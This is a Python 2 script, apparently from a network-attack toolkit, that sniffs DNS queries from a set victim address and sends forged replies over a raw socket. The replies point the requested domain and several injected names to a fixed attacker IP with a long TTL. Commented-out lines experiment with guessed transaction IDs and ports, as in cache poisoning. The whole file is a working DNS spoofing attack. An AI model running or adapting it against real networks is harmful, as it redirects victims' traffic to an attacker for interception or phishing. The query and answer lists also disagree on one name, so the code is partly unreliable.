#!/usr/bin/env python

from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(abspath(__file__))))

from base import Base
from argparse import ArgumentParser
from scapy.all import sniff, Ether, IP, UDP, DNS
from network import DNS_raw
from socket import socket, AF_PACKET, SOCK_RAW, gethostbyname
from random import randint

current_network_interface = "eth0"

Base = Base()
Base.check_user()
Base.check_platform()
Base.print_banner()

dns = DNS_raw()

parser = ArgumentParser(description='DNS server')
parser.add_argument('-i', '--interface', help='Set interface name for send DNS reply packets')
args = parser.parse_args()

if args.interface is None:
    current_network_interface = Base.netiface_selection()
else:
    current_network_interface = args.interface

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(current_network_interface)
if your_ip_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IP address!"
    exit(1)

SOCK = socket(AF_PACKET, SOCK_RAW)
SOCK.bind((current_network_interface, 0))


def dns_reply(request):
    # DNS REQUESTS
    if request.haslayer(DNS):
        try:
            print "MAC src: " + str(request[Ether].src)
            print "MAC dst: " + str(request[Ether].dst)
            print "IP src: " + str(request[IP].src)
            print "IP dst: " + str(request[IP].dst)
            print "Src port: " + str(request[UDP].sport)
            print "Dst port: " + str(request[UDP].dport)
            print "DNS id: " + str(request[DNS].id)
            print "DNS opcode: " + str(request[DNS].opcode)
            print "DNS type: " + str(request[DNS].qd.qtype)
            print "DNS class: " + str(request[DNS].qd.qclass)
            print "DNS name: " + str(request[DNS].qd.qname)
            print ""

            transation_id = request[DNS].id
            dst_port = request[UDP].sport

            # transation_id = 0xffff
            # dst_port = 0xffff
            # dst_port = 53

            # transation_id = randint(0, 0xffff)
            # dst_port = randint(50000, 65000)

            dns_answer_packet = None

            # if request[DNS].qd.qtype == 12:
            #     answer = [
            #         {"type": 12, "class": 1, "ttl": 0xffff, "address": "192.168.0.112"}
            #     ]
            #     dns_answer_packet = dns.make_response_packet(src_mac=your_mac_address,
            #                                                  dst_mac=request[Ether].src,
            #                                                  src_ip=your_ip_address,
            #                                                  dst_ip=request[IP].src,
            #                                                  src_port=request[UDP].dport,
            #                                                  dst_port=dst_port,
            #                                                  tid=transation_id,
            #                                                  flags=0x8580,
            #                                                  query_name=request[DNS].qd.qname,
            #                                                  query_type=request[DNS].qd.qtype,
            #                                                  query_class=request[DNS].qd.qclass,
            #                                                  answers_address=answer)

            if request[DNS].qd.qtype == 1:
                if request[DNS].qd.qname.endswith("."):
                    domain = request[DNS].qd.qname[:-1]
                else:
                    domain = request[DNS].qd.qname

                queries = [
                    {"type": 1, "class": 1, "name": domain},
                    {"type": 1, "class": 1, "name": "asdf.com"},
                    {"type": 1, "class": 1, "name": "test123.com"},
                    {"type": 1, "class": 1, "name": "asdf.ru"}
                ]

                # queries = [
                #     {"type": 1, "class": 1, "name": domain},
                # ]

                # address = gethostbyname(domain)
                address = "192.168.0.107"

                answers = [
                    {"name": domain, "type": 1, "class": 1, "ttl": 0xffff, "address": address},
                    {"name": "asdf.com", "type": 1, "class": 1, "ttl": 0xffff, "address": address},
                    {"name": "asdf.ru", "type": 1, "class": 1, "ttl": 0xffff, "address": address},
                    {"name": "test123.ru", "type": 1, "class": 1, "ttl": 0xffff, "address": address}
                ]

                dns_answer_packet = dns.make_response_packet(src_mac=your_mac_address,
                                                             dst_mac=request[Ether].src,
                                                             src_ip=your_ip_address,
                                                             dst_ip=request[IP].src,
                                                             src_port=53,
                                                             dst_port=dst_port,
                                                             tid=transation_id,
                                                             flags=0x8580,
                                                             queries=queries,
                                                             answers_address=answers)

            if dns_answer_packet is not None:
                SOCK.send(dns_answer_packet)
        except:
            pass


if __name__ == "__main__":
    print Base.c_info + "Waiting for DNS query"
    sniff(filter="host 192.168.0.106 and udp and dst port 53", prn=dns_reply, iface=current_network_interface)
    # sniff(filter="host not 192.168.0.112 and udp and (dst port 53 or dst port 5353)", prn=dns_reply, iface=current_network_interface)
